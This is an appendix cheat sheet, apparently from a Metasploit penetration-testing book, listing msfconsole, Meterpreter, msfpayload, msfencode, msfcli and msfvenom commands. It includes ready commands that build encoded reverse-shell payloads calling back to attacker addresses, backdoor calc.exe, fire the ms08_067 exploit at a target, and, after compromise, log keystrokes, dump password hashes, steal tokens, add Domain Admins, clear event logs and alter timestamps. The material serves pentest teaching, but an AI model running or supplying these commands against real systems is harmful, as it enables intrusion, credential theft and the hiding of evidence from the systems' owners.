<html><head></head><body><section epub:type="appendix" id="cheat_sheet"><div class="titlepage"><div class="book"><div class="book"><h2 class="title1">Appendix B. Cheat Sheet</h2></div></div></div><p class="calibre2">Here is a reference for the most frequently used commands and syntax within Metasploit’s various interfaces and utilities. See <a class="xref" href="part0023.html#meterpreter_post_exploitation_commands">Meterpreter Post Exploitation Commands</a> in <a class="xref" href="part0023.html#msfencode_commands">MSFencode Commands</a> for some all-in-one commands that will make your life easier.<a id="IDX-APP-B-0145" class="strong"/><a id="IDX-APP-B-0146" class="strong"/><a id="IDX-APP-B-0147" class="strong"/><a id="IDX-APP-B-0148" class="strong"/><a id="IDX-APP-B-0149" class="strong"/></p><div class="book"><div class="titlepage"><div class="book"><div class="book"><h2 class="title2" id="msfconsole_commands">MSFconsole Commands</h2></div></div></div><div class="book"><div class="variable_list_term"><span class="strong"><strong class="calibre3"><code class="calibre6">show exploits</code></strong></span></div><blockquote class="variable_list_definition"><div class="book">Show all exploits within the Framework.</div></blockquote><div class="variable_list_term"><span class="strong"><strong class="calibre3"><code class="calibre6">show payloads</code></strong></span></div><blockquote class="variable_list_definition"><div class="book">Show all payloads within the Framework.</div></blockquote><div class="variable_list_term"><span class="strong"><strong class="calibre3"><code class="calibre6">show auxiliary</code></strong></span></div><blockquote class="variable_list_definition"><div class="book">Show all auxiliary modules within the Framework.</div></blockquote><div class="variable_list_term"><span class="strong"><strong class="calibre3"><code class="calibre6">search</code></strong> <strong class="calibre3"><code class="calibre6"><em class="calibre4"><code class="calibre13">name</code></em></code></strong></span></div><blockquote class="variable_list_definition"><div class="book">Search for exploits or modules within the Framework.</div></blockquote><div class="variable_list_term"><span class="strong"><strong class="calibre3"><code class="calibre6">info</code></strong></span></div><blockquote class="variable_list_definition"><div class="book">Load information about a specific exploit or module.<a id="IDX-APP-B-0150" class="strong"/><a id="IDX-APP-B-0151" class="strong"/><a id="IDX-APP-B-0152" class="strong"/><a id="IDX-APP-B-0153" class="strong"/><a id="IDX-APP-B-0154" class="strong"/><a id="IDX-APP-B-0155" class="strong"/><a id="IDX-APP-B-0156" class="strong"/><a id="IDX-APP-B-0157" class="strong"/><a id="IDX-APP-B-0158" class="strong"/><a id="IDX-APP-B-0159" class="strong"/><a id="IDX-APP-B-0160" class="strong"/><a id="IDX-APP-B-0161" class="strong"/></div></blockquote><div class="variable_list_term"><span class="strong"><strong class="calibre3"><code class="calibre6">use</code></strong> <strong class="calibre3"><code class="calibre6"><em class="calibre4"><code class="calibre13">name</code></em></code></strong></span></div><blockquote class="variable_list_definition"><div class="book">Load an exploit or module (example: <code class="literal">use windows/smb/psexec</code>).</div></blockquote><div class="variable_list_term"><span class="strong"><strong class="calibre3"><code class="calibre6">LHOST</code></strong></span></div><blockquote class="variable_list_definition"><div class="book">Your local host’s IP address reachable by the target, often the public IP address when not on a local network. Typically used for reverse shells.</div></blockquote><div class="variable_list_term"><span class="strong"><strong class="calibre3"><code class="calibre6">RHOST</code></strong></span></div><blockquote class="variable_list_definition"><div class="book">The remote host or the target.</div></blockquote><div class="variable_list_term"><span class="strong"><strong class="calibre3"><code class="calibre6">set</code></strong> <strong class="calibre3"><code class="calibre6"><em class="calibre4"><code class="calibre13">function</code></em></code></strong></span></div><blockquote class="variable_list_definition"><div class="book">Set a specific value (for example, <code class="literal">LHOST</code> or <code class="literal">RHOST</code>).</div></blockquote><div class="variable_list_term"><span class="strong"><strong class="calibre3"><code class="calibre6">setg</code></strong> <strong class="calibre3"><code class="calibre6"><em class="calibre4"><code class="calibre13">function</code></em></code></strong></span></div><blockquote class="variable_list_definition"><div class="book">Set a specific value globally (for example, <code class="literal">LHOST</code> or <code class="literal">RHOST</code>).</div></blockquote><div class="variable_list_term"><span class="strong"><strong class="calibre3"><code class="calibre6">show options</code></strong></span></div><blockquote class="variable_list_definition"><div class="book">Show the options available for a module or exploit.</div></blockquote><div class="variable_list_term"><span class="strong"><strong class="calibre3"><code class="calibre6">show targets</code></strong></span></div><blockquote class="variable_list_definition"><div class="book">Show the platforms supported by the exploit.</div></blockquote><div class="variable_list_term"><span class="strong"><strong class="calibre3"><code class="calibre6">set target</code></strong> <strong class="calibre3"><code class="calibre6"><em class="calibre4"><code class="calibre13">num</code></em></code></strong></span></div><blockquote class="variable_list_definition"><div class="book">Specify a specific target index if you know the OS and service pack.</div></blockquote><div class="variable_list_term"><span class="strong"><strong class="calibre3"><code class="calibre6">set payload</code></strong> <strong class="calibre3"><code class="calibre6"><em class="calibre4"><code class="calibre13">payload</code></em></code></strong></span></div><blockquote class="variable_list_definition"><div class="book">Specify the payload to use.</div></blockquote><div class="variable_list_term"><span class="strong"><strong class="calibre3"><code class="calibre6">show advanced</code></strong></span></div><blockquote class="variable_list_definition"><div class="book">Show advanced options.</div></blockquote><div class="variable_list_term"><span class="strong"><strong class="calibre3"><code class="calibre6">set autorunscript migrate -f</code></strong></span></div><blockquote class="variable_list_definition"><div class="book">Automatically migrate to a separate process upon exploit completion.</div></blockquote><div class="variable_list_term"><span class="strong"><strong class="calibre3"><code class="calibre6">check</code></strong></span></div><blockquote class="variable_list_definition"><div class="book">Determine whether a target is vulnerable to an attack.</div></blockquote><div class="variable_list_term"><span class="strong"><strong class="calibre3"><code class="calibre6">exploit</code></strong></span></div><blockquote class="variable_list_definition"><div class="book">Execute the module or exploit and attack the target.</div></blockquote><div class="variable_list_term"><span class="strong"><strong class="calibre3"><code class="calibre6">exploit -j</code></strong></span></div><blockquote class="variable_list_definition"><div class="book">Run the exploit under the context of the job. (This will run the exploit in the background.)</div></blockquote><div class="variable_list_term"><span class="strong"><strong class="calibre3"><code class="calibre6">exploit -z</code></strong></span></div><blockquote class="variable_list_definition"><div class="book">Do not interact with the session after successful exploitation.</div></blockquote><div class="variable_list_term"><span class="strong"><strong class="calibre3"><code class="calibre6">exploit -e</code></strong> <strong class="calibre3"><code class="calibre6"><em class="calibre4"><code class="calibre13">encoder</code></em></code></strong></span></div><blockquote class="variable_list_definition"><div class="book">Specify the payload encoder to use (example: <code class="literal">exploit -e shikata_ga_nai</code>).</div></blockquote><div class="variable_list_term"><span class="strong"><strong class="calibre3"><code class="calibre6">exploit -h</code></strong></span></div><blockquote class="variable_list_definition"><div class="book">Display help for the <code class="literal">exploit</code> command.</div></blockquote><div class="variable_list_term"><span class="strong"><strong class="calibre3"><code class="calibre6">sessions -l</code></strong></span></div><blockquote class="variable_list_definition"><div class="book">List available sessions (used when handling multiple shells).</div></blockquote><div class="variable_list_term"><span class="strong"><strong class="calibre3"><code class="calibre6">sessions -l -v</code></strong></span></div><blockquote class="variable_list_definition"><div class="book">List all available sessions and show verbose fields, such as which vulnerability was used when exploiting the system.<a id="IDX-APP-B-0162" class="strong"/><a id="IDX-APP-B-0163" class="strong"/><a id="IDX-APP-B-0164" class="strong"/><a id="IDX-APP-B-0165" class="strong"/><a id="IDX-APP-B-0166" class="strong"/><a id="IDX-APP-B-0167" class="strong"/><a id="IDX-APP-B-0168" class="strong"/><a id="IDX-APP-B-0169" class="strong"/><a id="IDX-APP-B-0170" class="strong"/><a id="IDX-APP-B-0171" class="strong"/><a id="IDX-APP-B-0172" class="strong"/><a id="IDX-APP-B-0173" class="strong"/><a id="IDX-APP-B-0174" class="strong"/><a id="IDX-APP-B-0175" class="strong"/><a id="IDX-APP-B-0176" class="strong"/><a id="IDX-APP-B-0177" class="strong"/><a id="IDX-APP-B-0178" class="strong"/></div></blockquote><div class="variable_list_term"><span class="strong"><strong class="calibre3"><code class="calibre6">sessions -s</code></strong> <strong class="calibre3"><code class="calibre6"><em class="calibre4"><code class="calibre13">script</code></em></code></strong></span></div><blockquote class="variable_list_definition"><div class="book">Run a specific Meterpreter script on all Meterpreter live sessions.</div></blockquote><div class="variable_list_term"><span class="strong"><strong class="calibre3"><code class="calibre6">sessions -K</code></strong></span></div><blockquote class="variable_list_definition"><div class="book">Kill all live sessions.</div></blockquote><div class="variable_list_term"><span class="strong"><strong class="calibre3"><code class="calibre6">sessions -c</code></strong> <strong class="calibre3"><code class="calibre6"><em class="calibre4"><code class="calibre13">cmd</code></em></code></strong></span></div><blockquote class="variable_list_definition"><div class="book">Execute a command on all live Meterpreter sessions.</div></blockquote><div class="variable_list_term"><span class="strong"><strong class="calibre3"><code class="calibre6">sessions -u</code></strong> <strong class="calibre3"><code class="calibre6"><em class="calibre4"><code class="calibre13">sessionID</code></em></code></strong></span></div><blockquote class="variable_list_definition"><div class="book">Upgrade a normal Win32 shell to a Meterpreter console.</div></blockquote><div class="variable_list_term"><span class="strong"><strong class="calibre3"><code class="calibre6">db_create</code></strong> <strong class="calibre3"><code class="calibre6"><em class="calibre4"><code class="calibre13">name</code></em></code></strong></span></div><blockquote class="variable_list_definition"><div class="book">Create a database to use with database-driven attacks (example: <code class="literal">db_create autopwn</code>).</div></blockquote><div class="variable_list_term"><span class="strong"><strong class="calibre3"><code class="calibre6">db_connect</code></strong> <strong class="calibre3"><code class="calibre6"><em class="calibre4"><code class="calibre13">name</code></em></code></strong></span></div><blockquote class="variable_list_definition"><div class="book">Create and connect to a database for driven attacks (example: <code class="literal">db_connect autopwn</code>).</div></blockquote><div class="variable_list_term"><span class="strong"><strong class="calibre3"><code class="calibre6">db_nmap</code></strong></span></div><blockquote class="variable_list_definition"><div class="book">Use <span class="strong"><em class="calibre4">nmap</em></span> and place results in database. (Normal <span class="strong"><em class="calibre4">nmap</em></span> syntax is supported, such as <code class="literal">-sT -v -P0</code>.)</div></blockquote><div class="variable_list_term"><span class="strong"><strong class="calibre3"><code class="calibre6">db_autopwn -h</code></strong></span></div><blockquote class="variable_list_definition"><div class="book">Display help for using <code class="literal">db_autopwn</code>.</div></blockquote><div class="variable_list_term"><span class="strong"><strong class="calibre3"><code class="calibre6">db_autopwn -p -r -e</code></strong></span></div><blockquote class="variable_list_definition"><div class="book">Run <code class="literal">db_autopwn</code> against all ports found, use a reverse shell, and exploit all systems.</div></blockquote><div class="variable_list_term"><span class="strong"><strong class="calibre3"><code class="calibre6">db_destroy</code></strong></span></div><blockquote class="variable_list_definition"><div class="book">Delete the current database.</div></blockquote><div class="variable_list_term"><span class="strong"><strong class="calibre3"><code class="calibre6">db_destroy</code></strong> <strong class="calibre3"><code class="calibre6"><em class="calibre4"><code class="calibre13">user:password@host:port/database</code></em></code></strong></span></div><blockquote class="variable_list_definition"><div class="book">Delete database using advanced options.</div></blockquote></div></div><div class="book"><div class="titlepage"><div class="book"><div class="book"><h2 class="title2" id="meterpreter_commands">Meterpreter Commands</h2></div></div></div><div class="book"><div class="variable_list_term"><span class="strong"><strong class="calibre3"><code class="calibre6">help</code></strong></span></div><blockquote class="variable_list_definition"><div class="book">Open Meterpreter usage help.</div></blockquote><div class="variable_list_term"><span class="strong"><strong class="calibre3"><code class="calibre6">run</code></strong> <strong class="calibre3"><code class="calibre6"><em class="calibre4"><code class="calibre13">scriptname</code></em></code></strong></span></div><blockquote class="variable_list_definition"><div class="book">Run Meterpreter-based scripts; for a full list check the <span class="strong"><em class="calibre4">scripts/meterpreter</em></span> directory.</div></blockquote><div class="variable_list_term"><span class="strong"><strong class="calibre3"><code class="calibre6">sysinfo</code></strong></span></div><blockquote class="variable_list_definition"><div class="book">Show the system information on the compromised target.</div></blockquote><div class="variable_list_term"><span class="strong"><strong class="calibre3"><code class="calibre6">ls</code></strong></span></div><blockquote class="variable_list_definition"><div class="book">List the files and folders on the target.</div></blockquote><div class="variable_list_term"><span class="strong"><strong class="calibre3"><code class="calibre6">use priv</code></strong></span></div><blockquote class="variable_list_definition"><div class="book">Load the privilege extension for extended Meterpreter libraries.<a id="IDX-APP-B-0179" class="strong"/><a id="IDX-APP-B-0180" class="strong"/><a id="IDX-APP-B-0181" class="strong"/><a id="IDX-APP-B-0182" class="strong"/><a id="IDX-APP-B-0183" class="strong"/><a id="IDX-APP-B-0184" class="strong"/><a id="IDX-APP-B-0185" class="strong"/><a id="IDX-APP-B-0186" class="strong"/><a id="IDX-APP-B-0187" class="strong"/><a id="IDX-APP-B-0188" class="strong"/><a id="IDX-APP-B-0189" class="strong"/><a id="IDX-APP-B-0190" class="strong"/><a id="IDX-APP-B-0191" class="strong"/><a id="IDX-APP-B-0192" class="strong"/><a id="IDX-APP-B-0193" class="strong"/><a id="IDX-APP-B-0194" class="strong"/></div></blockquote><div class="variable_list_term"><span class="strong"><strong class="calibre3"><code class="calibre6">ps</code></strong></span></div><blockquote class="variable_list_definition"><div class="book">Show all running processes and which accounts are associated with each process.</div></blockquote><div class="variable_list_term"><span class="strong"><strong class="calibre3"><code class="calibre6">migrate</code></strong> <strong class="calibre3"><code class="calibre6"><em class="calibre4"><code class="calibre13">PID</code></em></code></strong></span></div><blockquote class="variable_list_definition"><div class="book">Migrate to the specific process ID (PID is the target process ID gained from the <code class="literal">ps</code> command).</div></blockquote><div class="variable_list_term"><span class="strong"><strong class="calibre3"><code class="calibre6">use incognito</code></strong></span></div><blockquote class="variable_list_definition"><div class="book">Load <span class="strong"><em class="calibre4">incognito</em></span> functions. (Used for token stealing and impersonation on a target machine.)</div></blockquote><div class="variable_list_term"><span class="strong"><strong class="calibre3"><code class="calibre6">list_tokens -u</code></strong></span></div><blockquote class="variable_list_definition"><div class="book">List available tokens on the target by user.</div></blockquote><div class="variable_list_term"><span class="strong"><strong class="calibre3"><code class="calibre6">list_tokens -g</code></strong></span></div><blockquote class="variable_list_definition"><div class="book">List available tokens on the target by group.</div></blockquote><div class="variable_list_term"><span class="strong"><strong class="calibre3"><code class="calibre6">impersonate_token DOMAIN_NAME\\USERNAME</code></strong></span></div><blockquote class="variable_list_definition"><div class="book">Impersonate a token available on the target.</div></blockquote><div class="variable_list_term"><span class="strong"><strong class="calibre3"><code class="calibre6">steal_token</code></strong> <strong class="calibre3"><code class="calibre6"><em class="calibre4"><code class="calibre13">PID</code></em></code></strong></span></div><blockquote class="variable_list_definition"><div class="book">Steal the tokens available for a given process and impersonate that token.</div></blockquote><div class="variable_list_term"><span class="strong"><strong class="calibre3"><code class="calibre6">drop_token</code></strong></span></div><blockquote class="variable_list_definition"><div class="book">Stop impersonating the current token.</div></blockquote><div class="variable_list_term"><span class="strong"><strong class="calibre3"><code class="calibre6">getsystem</code></strong></span></div><blockquote class="variable_list_definition"><div class="book">Attempt to elevate permissions to SYSTEM-level access through multiple attack vectors.</div></blockquote><div class="variable_list_term"><span class="strong"><strong class="calibre3"><code class="calibre6">shell</code></strong></span></div><blockquote class="variable_list_definition"><div class="book">Drop into an interactive shell with all available tokens.</div></blockquote><div class="variable_list_term"><span class="strong"><strong class="calibre3"><code class="calibre6">execute -f cmd.exe -i</code></strong></span></div><blockquote class="variable_list_definition"><div class="book">Execute <span class="strong"><em class="calibre4">cmd.exe</em></span> and interact with it.</div></blockquote><div class="variable_list_term"><span class="strong"><strong class="calibre3"><code class="calibre6">execute -f cmd.exe -i -t</code></strong></span></div><blockquote class="variable_list_definition"><div class="book">Execute <span class="strong"><em class="calibre4">cmd.exe</em></span> with all available tokens.</div></blockquote><div class="variable_list_term"><span class="strong"><strong class="calibre3"><code class="calibre6">execute -f cmd.exe -i -H -t</code></strong></span></div><blockquote class="variable_list_definition"><div class="book">Execute <span class="strong"><em class="calibre4">cmd.exe</em></span> with all available tokens and make it a hidden process.</div></blockquote><div class="variable_list_term"><span class="strong"><strong class="calibre3"><code class="calibre6">rev2self</code></strong></span></div><blockquote class="variable_list_definition"><div class="book">Revert back to the original user you used to compromise the target.</div></blockquote><div class="variable_list_term"><span class="strong"><strong class="calibre3"><code class="calibre6">reg</code></strong> <strong class="calibre3"><code class="calibre6"><em class="calibre4"><code class="calibre13">command</code></em></code></strong></span></div><blockquote class="variable_list_definition"><div class="book">Interact, create, delete, query, set, and much more in the target’s registry.</div></blockquote><div class="variable_list_term"><span class="strong"><strong class="calibre3"><code class="calibre6">setdesktop</code></strong> <strong class="calibre3"><code class="calibre6"><em class="calibre4"><code class="calibre13">number</code></em></code></strong></span></div><blockquote class="variable_list_definition"><div class="book">Switch to a different screen based on who is logged in.</div></blockquote><div class="variable_list_term"><span class="strong"><strong class="calibre3"><code class="calibre6">screenshot</code></strong></span></div><blockquote class="variable_list_definition"><div class="book">Take a screenshot of the target’s screen.</div></blockquote><div class="variable_list_term"><span class="strong"><strong class="calibre3"><code class="calibre6">upload</code></strong> <strong class="calibre3"><code class="calibre6"><em class="calibre4"><code class="calibre13">file</code></em></code></strong></span></div><blockquote class="variable_list_definition"><div class="book">Upload a file to the target.<a id="IDX-APP-B-0195" class="strong"/><a id="IDX-APP-B-0196" class="strong"/><a id="IDX-APP-B-0197" class="strong"/><a id="IDX-APP-B-0198" class="strong"/><a id="IDX-APP-B-0199" class="strong"/><a id="IDX-APP-B-0200" class="strong"/><a id="IDX-APP-B-0201" class="strong"/><a id="IDX-APP-B-0202" class="strong"/><a id="IDX-APP-B-0203" class="strong"/><a id="IDX-APP-B-0204" class="strong"/><a id="IDX-APP-B-0205" class="strong"/><a id="IDX-APP-B-0206" class="strong"/><a id="IDX-APP-B-0207" class="strong"/><a id="IDX-APP-B-0208" class="strong"/><a id="IDX-APP-B-0209" class="strong"/><a id="IDX-APP-B-0210" class="strong"/><a id="IDX-APP-B-0211" class="strong"/><a id="IDX-APP-B-0212" class="strong"/><a id="IDX-APP-B-0213" class="strong"/><a id="IDX-APP-B-0214" class="strong"/></div></blockquote><div class="variable_list_term"><span class="strong"><strong class="calibre3"><code class="calibre6">download</code></strong> <strong class="calibre3"><code class="calibre6"><em class="calibre4"><code class="calibre13">file</code></em></code></strong></span></div><blockquote class="variable_list_definition"><div class="book">Download a file from the target.</div></blockquote><div class="variable_list_term"><span class="strong"><strong class="calibre3"><code class="calibre6">keyscan_start</code></strong></span></div><blockquote class="variable_list_definition"><div class="book">Start sniffing keystrokes on the remote target.</div></blockquote><div class="variable_list_term"><span class="strong"><strong class="calibre3"><code class="calibre6">keyscan_dump</code></strong></span></div><blockquote class="variable_list_definition"><div class="book">Dump the remote keys captured on the target.</div></blockquote><div class="variable_list_term"><span class="strong"><strong class="calibre3"><code class="calibre6">keyscan_stop</code></strong></span></div><blockquote class="variable_list_definition"><div class="book">Stop sniffing keystrokes on the remote target.</div></blockquote><div class="variable_list_term"><span class="strong"><strong class="calibre3"><code class="calibre6">getprivs</code></strong></span></div><blockquote class="variable_list_definition"><div class="book">Get as many privileges as possible on the target.</div></blockquote><div class="variable_list_term"><span class="strong"><strong class="calibre3"><code class="calibre6">uictl enable keyboard/mouse</code></strong></span></div><blockquote class="variable_list_definition"><div class="book">Take control of the keyboard and/or mouse.</div></blockquote><div class="variable_list_term"><span class="strong"><strong class="calibre3"><code class="calibre6">background</code></strong></span></div><blockquote class="variable_list_definition"><div class="book">Run your current Meterpreter shell in the background.</div></blockquote><div class="variable_list_term"><span class="strong"><strong class="calibre3"><code class="calibre6">hashdump</code></strong></span></div><blockquote class="variable_list_definition"><div class="book">Dump all hashes on the target.</div></blockquote><div class="variable_list_term"><span class="strong"><strong class="calibre3"><code class="calibre6">use sniffer</code></strong></span></div><blockquote class="variable_list_definition"><div class="book">Load the sniffer module.</div></blockquote><div class="variable_list_term"><span class="strong"><strong class="calibre3"><code class="calibre6">sniffer_interfaces</code></strong></span></div><blockquote class="variable_list_definition"><div class="book">List the available interfaces on the target.</div></blockquote><div class="variable_list_term"><span class="strong"><strong class="calibre3"><code class="calibre6">sniffer_dump</code></strong> <strong class="calibre3"><code class="calibre6"><em class="calibre4"><code class="calibre13">interfaceID pcapname</code></em></code></strong></span></div><blockquote class="variable_list_definition"><div class="book">Start sniffing on the remote target.</div></blockquote><div class="variable_list_term"><span class="strong"><strong class="calibre3"><code class="calibre6">sniffer_start</code></strong> <strong class="calibre3"><code class="calibre6"><em class="calibre4"><code class="calibre13">interfaceID packet-buffer</code></em></code></strong></span></div><blockquote class="variable_list_definition"><div class="book">Start sniffing with a specific range for a packet buffer.</div></blockquote><div class="variable_list_term"><span class="strong"><strong class="calibre3"><code class="calibre6">sniffer_stats</code></strong> <strong class="calibre3"><code class="calibre6"><em class="calibre4"><code class="calibre13">interfaceID</code></em></code></strong></span></div><blockquote class="variable_list_definition"><div class="book">Grab statistical information from the interface you are sniffing.</div></blockquote><div class="variable_list_term"><span class="strong"><strong class="calibre3"><code class="calibre6">sniffer_stop</code></strong> <strong class="calibre3"><code class="calibre6"><em class="calibre4"><code class="calibre13">interfaceID</code></em></code></strong></span></div><blockquote class="variable_list_definition"><div class="book">Stop the sniffer.</div></blockquote><div class="variable_list_term"><span class="strong"><strong class="calibre3"><code class="calibre6">add_user</code></strong> <strong class="calibre3"><code class="calibre6"><em class="calibre4"><code class="calibre13">username password</code></em></code></strong> <strong class="calibre3"><code class="calibre6">-h</code></strong> <strong class="calibre3"><code class="calibre6"><em class="calibre4"><code class="calibre13">ip</code></em></code></strong></span></div><blockquote class="variable_list_definition"><div class="book">Add a user on the remote target.</div></blockquote><div class="variable_list_term"><span class="strong"><strong class="calibre3"><code class="calibre6">add_group_user "Domain Admins"</code></strong> <strong class="calibre3"><code class="calibre6"><em class="calibre4"><code class="calibre13">username</code></em></code></strong> <strong class="calibre3"><code class="calibre6">-h</code></strong> <strong class="calibre3"><code class="calibre6"><em class="calibre4"><code class="calibre13">ip</code></em></code></strong></span></div><blockquote class="variable_list_definition"><div class="book">Add a username to the <span class="strong"><em class="calibre4">Domain Administrators</em></span> group on the remote target.</div></blockquote><div class="variable_list_term"><span class="strong"><strong class="calibre3"><code class="calibre6">clearev</code></strong></span></div><blockquote class="variable_list_definition"><div class="book">Clear the event log on the target machine.</div></blockquote><div class="variable_list_term"><span class="strong"><strong class="calibre3"><code class="calibre6">timestomp</code></strong></span></div><blockquote class="variable_list_definition"><div class="book">Change file attributes, such as creation date (antiforensics measure).</div></blockquote><div class="variable_list_term"><span class="strong"><strong class="calibre3"><code class="calibre6">reboot</code></strong></span></div><blockquote class="variable_list_definition"><div class="book">Reboot the target machine.</div></blockquote></div></div><div class="book"><div class="titlepage"><div class="book"><div class="book"><h2 class="title2" id="msfpayload_commands">MSFpayload Commands</h2></div></div></div><div class="book"><div class="variable_list_term"><span class="strong"><strong class="calibre3"><code class="calibre6">msfpayload -h</code></strong></span></div><blockquote class="variable_list_definition"><div class="book">List available payloads.<a id="IDX-APP-B-0215" class="strong"/><a id="IDX-APP-B-0216" class="strong"/><a id="IDX-APP-B-0217" class="strong"/><a id="IDX-APP-B-0218" class="strong"/><a id="IDX-APP-B-0219" class="strong"/><a id="IDX-APP-B-0220" class="strong"/></div></blockquote><div class="variable_list_term"><span class="strong"><strong class="calibre3"><code class="calibre6">msfpayload windows/meterpreter/bind_tcp O</code></strong></span></div><blockquote class="variable_list_definition"><div class="book">List available options for the <code class="literal">windows/meterpreter/bind_tcp</code> payload (all of these can use any payload).</div></blockquote><div class="variable_list_term"><span class="strong"><strong class="calibre3"><code class="calibre6">msfpayload windows/meterpreter/reverse_tcp LHOST=192.168.1.5 LPORT=443 X &gt; payload.exe</code></strong></span></div><blockquote class="variable_list_definition"><div class="book">Create a Meterpreter <span class="strong"><em class="calibre4">reverse_tcp</em></span> payload to connect back to 192.168.1.5 and on port 443, and then save it as a Windows Portable Executable named <span class="strong"><em class="calibre4">payload.exe</em></span>.</div></blockquote><div class="variable_list_term"><span class="strong"><strong class="calibre3"><code class="calibre6">msfpayload windows/meterpreter/reverse_tcp LHOST=192.168.1.5 LPORT=443 R &gt; payload.raw</code></strong></span></div><blockquote class="variable_list_definition"><div class="book">Same as above, but export as raw format. This will be used later in <span class="strong"><em class="calibre4">msfencode</em></span>.</div></blockquote><div class="variable_list_term"><span class="strong"><strong class="calibre3"><code class="calibre6">msfpayload windows/meterpreter/bind_tcp LPORT=443 C &gt; payload.c</code></strong></span></div><blockquote class="variable_list_definition"><div class="book">Same as above but export as C-formatted shellcode.</div></blockquote><div class="variable_list_term"><span class="strong"><strong class="calibre3"><code class="calibre6">msfpayload windows/meterpreter/bind_tcp LPORT=443 J &gt; payload.java</code></strong></span></div><blockquote class="variable_list_definition"><div class="book">Export as <span class="strong"><em class="calibre4">%u encoded</em></span> JavaScript.</div></blockquote></div></div><div class="book"><div class="titlepage"><div class="book"><div class="book"><h2 class="title2" id="msfencode_commands">MSFencode Commands</h2></div></div></div><div class="book"><div class="variable_list_term"><span class="strong"><strong class="calibre3"><code class="calibre6">msfencode -h</code></strong></span></div><blockquote class="variable_list_definition"><div class="book">Display the <span class="strong"><em class="calibre4">msfencode</em></span> help.<a id="IDX-APP-B-0221" class="strong"/><a id="IDX-APP-B-0222" class="strong"/><a id="IDX-APP-B-0223" class="strong"/><a id="IDX-APP-B-0224" class="strong"/></div></blockquote><div class="variable_list_term"><span class="strong"><strong class="calibre3"><code class="calibre6">msfencode -l</code></strong></span></div><blockquote class="variable_list_definition"><div class="book">List the available encoders.</div></blockquote><div class="variable_list_term"><span class="strong"><strong class="calibre3"><code class="calibre6">msfencode -t (c, elf, exe, java, js_le, js_be, perl, raw, ruby, vba, vbs, loop-vbs, asp, war, macho)</code></strong></span></div><blockquote class="variable_list_definition"><div class="book">Format to display the encoded buffer.</div></blockquote><div class="variable_list_term"><span class="strong"><strong class="calibre3"><code class="calibre6">msfencode -i payload.raw -o encoded_payload.exe -e x86/shikata_ga_nai -c 5 -t exe</code></strong></span></div><blockquote class="variable_list_definition"><div class="book">Encode <code class="literal">payload.raw</code> with <code class="literal">shikata_ga_nai</code> five times and export it to an output file named <span class="strong"><em class="calibre4">encoded_payload.exe</em></span>.</div></blockquote><div class="variable_list_term"><span class="strong"><strong class="calibre3"><code class="calibre6">msfpayload windows/meterpreter/bind_tcp LPORT=443 R | msfencode -e x86/_countdown -c 5 -t raw | msfencode -e x86/shikata_ga_nai -c 5 -t exe -o multi-encoded_payload.exe</code></strong></span></div><blockquote class="variable_list_definition"><div class="book">Create a multi-encoded payload.</div></blockquote><div class="variable_list_term"><span class="strong"><strong class="calibre3"><code class="calibre6">msfencode -i payload.raw BufferRegister=ESI -e x86/alpha_mixed -t c</code></strong></span></div><blockquote class="variable_list_definition"><div class="book">Create pure alphanumeric shellcode where ESI points to the shellcode; output in C-style notation.</div></blockquote></div></div><div class="book"><div class="titlepage"><div class="book"><div class="book"><h2 class="title2" id="msfcli_commands">MSFcli Commands</h2></div></div></div><div class="book"><div class="variable_list_term"><span class="strong"><strong class="calibre3"><code class="calibre6">msfcli | grep exploit</code></strong></span></div><blockquote class="variable_list_definition"><div class="book">Show only exploits.</div></blockquote><div class="variable_list_term"><span class="strong"><strong class="calibre3"><code class="calibre6">msfcli | grep exploit/windows</code></strong></span></div><blockquote class="variable_list_definition"><div class="book">Show only Windows exploits.</div></blockquote><div class="variable_list_term"><span class="strong"><strong class="calibre3"><code class="calibre6">msfcli exploit/windows/smb/ms08_067_netapi PAYLOAD=windows/meterpreter/bind_tcp LPORT=443 RHOST=172.16.32.142 E</code></strong></span></div><blockquote class="variable_list_definition"><div class="book">Launch <code class="literal">ms08_067_netapi</code> exploit at 172.16.32.142 with a <code class="literal">bind_tcp</code> payload being delivered to listen on port 443.</div></blockquote></div></div><div class="book"><div class="titlepage"><div class="book"><div class="book"><h2 class="title2" id="msf_comma_ninja_comma_fu">MSF, Ninja, Fu</h2></div></div></div><div class="book"><div class="variable_list_term"><span class="strong"><strong class="calibre3"><code class="calibre6">msfpayload windows/meterpreter/reverse_tcp LHOST=192.168.1.5 LPORT=443 R | msfencode -x calc.exe -k -o payload.exe -e x86/shikata_ga_nai -c 7 -t exe</code></strong></span></div><blockquote class="variable_list_definition"><div class="book">Create a reverse Meterpreter payload connecting back to 192.168.1.5 on port 443 using <span class="strong"><em class="calibre4">calc.exe</em></span> as a template to backdoor. Keep execution flow within the application for it to continue to work, and output the <code class="literal">shikata_ga_nai</code> encoded payload to <span class="strong"><em class="calibre4">payload.exe</em></span>.</div></blockquote><div class="variable_list_term"><span class="strong"><strong class="calibre3"><code class="calibre6">msfpayload windows/meterpreter/reverse_tcp LHOST=192.168.1.5 LPORT=443 R | msfencode -x calc.exe -o payload.exe -e x86/shikata_ga_nai -c 7 -t exe</code></strong></span></div><blockquote class="variable_list_definition"><div class="book">Create a reverse Meterpreter payload connecting back to 192.168.1.5 on port 443 using <span class="strong"><em class="calibre4">calc.exe</em></span> as a template to backdoor. Does not keep execution flow within the application and will not prompt anything back to the end user when it is executed. This is useful when you have remote access via a browser exploit and don’t want the calculator application popping up to the end user. Also outputs the <code class="literal">shikata_ga_nai</code> encoded payload to <span class="strong"><em class="calibre4">payload.exe</em></span>.</div></blockquote><div class="variable_list_term"><span class="strong"><strong class="calibre3"><code class="calibre6">msfpayload windows/meterpreter/bind_tcp LPORT=443 R | msfencode -o payload.exe -e x86/shikata_ga_nai -c 7 -t exe &amp;&amp; msfcli multi/handler PAYLOAD=windows/meterpreter/bind_tcp LPORT=443 E</code></strong></span></div><blockquote class="variable_list_definition"><div class="book">Create a <code class="literal">bind_tcp</code> Meterpreter payload in raw format, encode it seven times using <code class="literal">shikata_ga_nai</code>, output it in Windows portable executable format with a name of <span class="strong"><em class="calibre4">payload.exe</em></span>, and then have a multi-handler listening for it to execute.</div></blockquote></div></div><div class="book"><div class="titlepage"><div class="book"><div class="book"><h2 class="title2" id="msfvenom">MSFvenom</h2></div></div></div><p class="calibre2">Leverage <span class="strong"><em class="calibre4">msfvenom</em></span>, an all-in-one suite, to create and encode your payload:<a id="IDX-APP-B-0225" class="strong"/></p><a id="I_programlisting_d1e22407" class="strong"/><pre class="programlisting"><strong class="calibre3"><code class="calibre6">msfvenom --payload</code></strong>
windows/meterpreter/reverse_tcp --format exe --encoder x86/shikata_ga_nai
   LHOST=172.16.1.32 LPORT=443 &gt; msf.exe
